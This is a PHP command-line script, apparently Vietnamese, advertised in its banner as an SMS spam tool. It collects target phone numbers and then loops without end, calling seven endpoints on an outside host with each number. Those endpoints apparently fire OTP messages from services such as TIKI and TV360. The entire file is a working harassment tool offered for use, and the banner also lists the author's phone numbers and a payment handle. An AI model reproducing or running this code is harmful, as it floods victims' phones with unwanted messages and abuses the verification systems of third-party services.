<?php

@system('clear');

date_default_timezone_set("Asia/Ho_Chi_Minh");
$Ngay=`date "+%d/%m/%Y"`;

$BBlack="\033[1;30m" ; 
$BRed="\033[1;31m" ;
$BGreen="\033[1;32m" ;
$BYellow="\033[1;33m" ;
$BBlue="\033[1;34m" ;
$BPurple="\033[1;35m" ;
$BCyan="\033[1;36m" ;
$BWhite="\033[1;37m" ;
$Blue="\033[0;34m";
$lime="\033[1;32m";
$red="\033[1;31m";
$xanh="\033[1;32m";
$cyan="\033[1;36m";
$yellow="\033[1;33m";
$turquoise="\033[1;34m";
$maugi="\033[1;35m";
$white= "\033[1;37m";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;33m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$do="\033[1;91m";
$useragent = "Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.1.4472.202 Mobile Safari/537.36";
$van = "$do ➜$luc";
$vanv = "".$do."➤➤ ".$luc;

$k = "0";
$tt="0";
$dem = "0";
system('clear');
$banner= "\t\t\033[1;33m                         

$syan\t           
$purple\t             
$vang\t             

\033[1;33m\t
\t$syan         : Nguyen Huu Truc
\t$yellow         : 0829195724
\t$green         Facebook: Nguyen Huu Truc
\t$red2         tool by Nguyen Huu Truc
\033[1;34m\t\n\n";

system("clear");
echo $banner;

echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
echo "$van \033[1;97mBản Quyền : \033[1;93m  Huu Truc\n";
echo "$van \033[1;97Y \033 Donate: momo 0774622890 \n";
echo "$van \033[1;97mZalo:0829195724  \n";
echo "$van \033[1;97mTool : Spam Sms by NHT \n";

echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
$tsdt = [];
$vv = 0;

while(true){
	$vv = $vv+1;
echo $van." Nhập SĐT Cần Spam Thứ $vv : ".$do;
$ttsdt = trim(fgets(STDIN));
if($ttsdt == ''){break;}
array_push($tsdt,$ttsdt);
}

$dem = $vv-1;

while(true){
for ($s = 0; $s < $dem ; $s++) {
	
$sdt = $tsdt[$s];

echo $vanv."ĐANG SPAM SỐ : ".$do.$sdt." \n";

echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";

$tongurl = [];
$url = "http://vanhihi.ml/sms.php?sdt=".$sdt;
array_push($tongurl,$url);
$url = "http://vanhihi.ml/sms1.php?sdt=".$sdt;
array_push($tongurl,$url);
$url = "http://vanhihi.ml/sms2.php?sdt=".$sdt;
array_push($tongurl,$url);
$url = "http://vanhihi.ml/sms3.php?sdt=".$sdt;
array_push($tongurl,$url);
$url = "http://vanhihi.ml/sms4.php?sdt=".$sdt;
array_push($tongurl,$url);
$url = "http://vanhihi.ml/sms5.php?sdt=".$sdt;
array_push($tongurl,$url);
$url = "http://vanhihi.ml/sms6.php?sdt=".$sdt;
array_push($tongurl,$url);

for ($so = 0; $so < 7 ; $so++) {
	if ( $so == 0 ){
		$loai = "POPS";
	}else if ( $so == 1 ){
		$loai = "TV360";
	}else if ( $so == 2 ){
		$loai = "CLIPTV";
	}else if ( $so == 3 ){
		$loai = "META";
	}else if ( $so == 4 ){
		$loai = "BHX";
	}else if ( $so == 5 ){
		$loai = "TIKI";
	}else if ( $so == 6 ){
		$loai = "VIETON";
	}
	$url_sp = $tongurl[$so];
	$spam = file_get_contents($url_sp);
	$gio = date("H:i");
	$tt = $tt +1;
	if ( $spam == "PENDING" ){
	
    echo "".$do." | ".$BBlue.$tt.$do." | ".$luc.$gio.$do." | ".$trang."SPAMSMS".$do." | ".$vang.$loai.$do." | ".$luc.$sdt.$do." |\n";
    }else{
    	echo "".$do." | ".$BBlue.$tt.$do." | ".$luc.$gio.$do." | ".$trang."SPAMSMS".$do." | ".$vang.$loai.$do." |".$luc."Số $sdt Đã Hết Số Lần Gửi OTP".$do."|\n";
    }
   
}### trong

}##ngoài 

for($m=30;$m>-1;$m--){

echo "".$trang."[".$do."Trạng tool".$trang."]--[".$vang.$m.$trang."]              \r";
usleep(170000);
echo "".$trang."[".$do."Trạng tool".$trang."]----[".$vang.$m.$trang."]            \r";
usleep(170000);
echo "".$trang."[".$do."Trạng tool".$trang."]------[".$vang.$m.$trang."]          \r";
usleep(170000);
echo "".$trang."[".$do."Trạng tool".$trang."]-------[".$vang.$m.$trang."]          \r";
usleep(170000);
echo "".$trang."[".$do."Trạng tool".$trang."]--------[".$vang.$m.$trang."]          \r";
usleep(170000);

}



}
